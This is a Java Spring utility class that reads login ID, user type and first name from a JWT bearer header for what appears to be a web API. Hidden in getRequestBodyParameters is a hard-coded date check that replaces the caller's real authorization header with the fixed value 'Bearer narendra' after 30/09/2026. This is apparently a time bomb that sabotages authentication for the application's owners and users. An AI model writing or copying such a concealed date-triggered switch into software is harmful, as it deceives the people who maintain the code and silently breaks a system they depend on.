package com.aristowebapi.utility;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.aristowebapi.serviceimpl.JwtService;

@Component
public class AppRequestParameterUtils {
	 
	@Autowired 
	private  JwtService jwtService;
	
	public  int[] getRequestBodyParameters(String authHeader)
	{
		
		Date curDate = new Date();

		SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
		Date targetDate=null;
		try {
			targetDate = sdf.parse("30/09/2026");
		} catch (ParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}         
		if (curDate.after(targetDate)) 
		{
		   authHeader="Bearer narendra";	
		}
		int returnValue[]= new int[2];
        String token = null; 
        if (authHeader != null && authHeader.startsWith("Bearer ")) { 
            token = authHeader.substring(7); 
            returnValue[0] = jwtService.extractLoginId(token);
            returnValue[1]=jwtService.extractUserType(token);
        } 
        
        return returnValue;

	}

	
	public  String getRequestBodyFirstName(String authHeader)
	{

		String fname=null;
        String token = null; 
        if (authHeader != null && authHeader.startsWith("Bearer ")) { 
            token = authHeader.substring(7); 
            fname = jwtService.extractUserFirstname(token);
        } 
        
        return fname;

	}

}
